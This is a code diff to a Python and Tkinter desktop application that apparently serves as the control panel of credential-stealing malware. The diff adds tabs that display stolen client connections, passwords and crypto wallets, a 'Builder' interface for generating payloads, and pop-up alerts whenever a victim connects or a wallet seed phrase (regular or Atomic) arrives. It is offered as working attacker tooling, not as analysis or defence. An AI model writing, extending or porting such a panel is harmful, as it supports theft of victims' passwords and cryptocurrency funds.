@@ -14,6 +14,9 @@ from .translation_manager import TranslationManager
 from .models import *
 from .network_server import NetworkServer
 from .live_chart import LiveChart
+from .report_form import NotificationManager
+from .data_viewer import ClientDataViewer, PasswordViewer, WalletViewer
+from .builder import BuilderInterface
 import webbrowser
 
 class MainForm:
@@ -33,6 +36,15 @@ class MainForm:
         
         # Network server
         self.server = None
+        
+        # Notification manager
+        self.notification_manager = None
+        
+        # Data viewers
+        self.client_viewer = None
+        self.password_viewer = None
+        self.wallet_viewer = None
+        self.builder_interface = None
         
         # Statistics
         self.country_stats = CountryStats()
@@ -77,6 +89,9 @@ class MainForm:
         
         # Create the main layout
         self._create_layout()
+        
+        # Initialize notification manager
+        self.notification_manager = NotificationManager(self.main_window)
         
         # Handle window close
         self.main_window.protocol("WM_DELETE_WINDOW", self._on_window_close)
@@ -341,10 +356,24 @@ class MainForm:
         logs_frame = ttk.Frame(self.notebook)
         self.notebook.add(logs_frame, text="Logs")
         
-        # Create detailed data grids here
-        # This would contain the password lists, wallet data, etc.
-        tk.Label(logs_frame, text="Logs and Data Analysis", 
-                font=("Segoe UI", 14, "bold")).pack(pady=20)
+        # Create sub-notebook for different data types
+        sub_notebook = ttk.Notebook(logs_frame)
+        sub_notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+        
+        # Client connections tab
+        client_frame = ttk.Frame(sub_notebook)
+        sub_notebook.add(client_frame, text="Client Connections")
+        self.client_viewer = ClientDataViewer(client_frame)
+        
+        # Passwords tab
+        password_frame = ttk.Frame(sub_notebook)
+        sub_notebook.add(password_frame, text="Passwords")
+        self.password_viewer = PasswordViewer(password_frame)
+        
+        # Wallets tab
+        wallet_frame = ttk.Frame(sub_notebook)
+        sub_notebook.add(wallet_frame, text="Wallets")
+        self.wallet_viewer = WalletViewer(wallet_frame)
     
     def _create_settings_tab(self):
         """Create the settings tab"""
@@ -387,8 +416,7 @@ Original C# version converted to Python + Tkinter
         builder_frame = ttk.Frame(self.notebook)
         self.notebook.add(builder_frame, text="Builder")
         
-        tk.Label(builder_frame, text="Builder Configuration", 
-                font=("Segoe UI", 14, "bold")).pack(pady=20)
+        self.builder_interface = BuilderInterface(builder_frame)
     
     # Navigation methods
     def _show_dashboard(self):
@@ -452,6 +480,14 @@ Original C# version converted to Python + Tkinter
             # Add to client list
             self.client_data.append(data)
             
+            # Add to client viewer if available
+            if self.client_viewer:
+                self.client_viewer.add_client(data)
+            
+            # Show notification
+            if self.notification_manager:
+                self.notification_manager.show_client_connected(data.ip)
+            
             # Update UI on main thread
             self.main_window.after_idle(self._update_client_list)
             self.main_window.after_idle(self._update_statistics)
@@ -464,12 +500,21 @@ Original C# version converted to Python + Tkinter
                     password=data.get('password', '')
                 )
                 self.mnemonic_data.append(mnemonic_data)
+                
+                # Show notification
+                if self.notification_manager:
+                    self.notification_manager.show_mnemonic_received("Regular")
+                    
             elif data.get('mnemonic_type') == 'atomic':
                 atomic_data = AtomicMnemonicData(
                     atomic_mnemonic=data.get('mnemonic', ''),
                     atomic_password=data.get('password', '')
                 )
                 self.atomic_mnemonic_data.append(atomic_data)
+                
+                # Show notification
+                if self.notification_manager:
+                    self.notification_manager.show_mnemonic_received("Atomic")
     
     def _update_client_list(self):
         """Update the client connections list"""
